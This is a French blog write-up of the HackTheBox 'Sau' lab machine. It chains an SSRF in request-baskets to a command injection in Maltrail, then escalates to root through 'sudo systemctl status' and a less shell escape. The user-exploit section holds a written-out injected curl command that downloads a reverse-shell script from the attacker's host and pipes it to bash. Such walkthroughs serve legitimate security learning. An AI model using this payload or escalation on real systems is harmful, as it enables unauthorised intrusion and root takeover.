+++
title = "HTB - Sau"
date = "2024-01-09"
author = "Brainmoustache"
authorTwitter = "BrainMoustache" #do not include @
cover = ""
tags = ["hackthebox", "sau", "ssrf", "command injection", "gtfobins"]
keywords = ["", ""]
description = "Resume of Sau from Hackthebox"
showFullContent = false
readingTime = true
hideComments = false
color = "blue"
+++

# HTB - Sau

## Enumeration:
Nmap
```bash
Nmap scan report for 10.129.167.17
Host is up (0.028s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION      
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown           
55555/tcp open     unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 08 Jul 2023 19:23:36 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close       
|     Request     
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 08 Jul 2023 19:23:11 GMT
|     Content-Length: 27    
|     href="/web">Found</a>.        
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 08 Jul 2023 19:23:11 GMT
|_    Content-Length: 0
```

## User exploit
Il y a deux vulnérabilités a exploiter afin d'obtenir un shell en tant que `User`.
Dans un premier temps `request-baskets v1.2.1` est vulnérable a une faille de type SSRF (Server Side Request Forgery). 

> Une faille de type SSRF permet d'effectuer des requêtes malicieuses par l'entremise du server Web vers un endroit arbitraire.

Cette vulnérabilité se situe dans les endpoints de l'API suivants au niveau du paramètre `forward_url`.
- /api/baskets/{name}
- /baskets/{name}

Lorsque le `Basket` est créé, il est possible de modifier ledit paramètre et d'y inséré une adresse IP locale. 

### Code vulnérable
- https://github.com/darklynx/request-baskets/tree/v1.2.1
```go
// https://github.com/darklynx/request-baskets/blob/a36e2ae402204050ce42a78d750785b4b10e7958/baskets.go#L18C1-L25C2

// BasketConfig describes single basket configuration.
type BasketConfig struct {
	ForwardURL    string `json:"forward_url"`
	ProxyResponse bool   `json:"proxy_response"`
	InsecureTLS   bool   `json:"insecure_tls"`
	ExpandPath    bool   `json:"expand_path"`
	Capacity      int    `json:"capacity"`
}
```
```go
// https://github.com/darklynx/request-baskets/blob/9e4107228f6b409ccd3c3d7371b0e0fd5a5798a1/baskets.go#L152

func (req *RequestData) Forward(client *http.Client, config BasketConfig, basket string) (*http.Response, error) {
	forwardURL, err := url.ParseRequestURI(config.ForwardURL)
	if err != nil {
		return nil, fmt.Errorf("invalid forward URL: %s - %s", config.ForwardURL, err)
	}

	// expand path
	if config.ExpandPath && len(req.Path) > len(basket)+1 {
		forwardURL.Path = expandURL(forwardURL.Path, req.Path, basket)
	}

	// append query
	if len(req.Query) > 0 {
		if len(forwardURL.RawQuery) > 0 {
			forwardURL.RawQuery += "&" + req.Query
		} else {
			forwardURL.RawQuery = req.Query
		}
	}
[...]
```
Lorsque le lien du panier est visité, la vulnérabilité est activée. 






Basé sur le résultat du scan nmap, il est possible de constater qu'une application est active sur le port `8338/tcp` mais que le trafic est filtré.
Il est donc possible d'effectuer des requêtes vers cette application grâce à la SSRF. Quelques requêtes suffises afin d'identifier que l'application active est `mailtrail`.

![](/content/img/htb/request_baskets_proxy_configuration.png)

La version du logiciel est `Mailtrail (v0.53)`. Cette version est vulnérable a une exécution de code au niveau du système d'exploitation (OS Command injection).

> Une vulnérabilité de type OS Command injection permet de faire exécuter du code arbitraire par le système d'exploitation. 

La vulnérabilité se situe au niveau de la fonction `subprocess.check_output` dans le paramètre `params.get("username")` dans le fichier `mailtrail/core/http.py`. 

```python
if not IS_WIN:
    try:
        subprocess.check_output(["logger", "-p", "auth.info", "-t", "%s[%d]" % (NAME.lower(), os.getpid()), "%s password for %s from %s port %s" % ("Accepted" if valid else "Failed", params.get("username"), self.client_address[0], self.client_address[1])], stderr=subprocess.STDOUT, shell=False)
    except Exception:
        if config.SHOW_DEBUG:
            traceback.print_exc()

return content
```
En combinant les deux vulnérabilités, il est possible d'obtenir un accès utilisateur sur la boxe.

```bash
#!/bin/bash

curl -k 'http://10.129.153.197:55555/qp9dxnt' --data 'username=;`/bin/curl 10.10.14.113/rev.sh | bash`'
```
User --> puma
## Root exploit
L'utilisateur `puma` a la permission d'exécuter une commande avec des droits de super utilisateur 

```bash
puma@sau:~$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
Voici une explication de la vulnérabilité

> *A vulnerability was found in the systemd package. The systemd package does not adequately block local privilege escalation for some Sudo configurations, for example, plausible sudoers files, in which the "systemctl status" command may be executed. Specifically, systemd does not set LESSSECURE to 1, and thus other programs may be launched from the less program. This issue presents a substantial security risk when running systemctl from Sudo because less executes as root when the terminal size is too small to show the complete systemctl output.*

En effectuant plusieurs requêtes vers le service `Maltrail`, `pager`, un binaire qui permet de visionner du contenu au niveau d'un terminal Linux sera exécuté.

`sudo /usr/bin/systemctl status trail.service`

`pager` pointe vers le binaire `less`. En exécutant la commande `!sh`, on obtient un shell en tant que `root`.

![](/content/img/htb/systemctl_status_less_lpe.png)

## Resources:

| Hyperlink                                                        | Info                           |
| ---------------------------------------------------------------- | ------------------------------ |
| https://notes.sjtu.edu.cn/s/MUUhEymt7                            | Exploit request-baskets v1.2.1 |
| https://github.com/advisories/GHSA-58g2-vgpg-335q                | Exploit request-baskets v1.2.1 |
| https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/ | Exploit MailTrail v0.53        |
| https://bugzilla.redhat.com/show_bug.cgi?id=2175611              | Exploit systemctl              |
| https://gtfobins.github.io/gtfobins/systemctl/                   | GTFObins                       |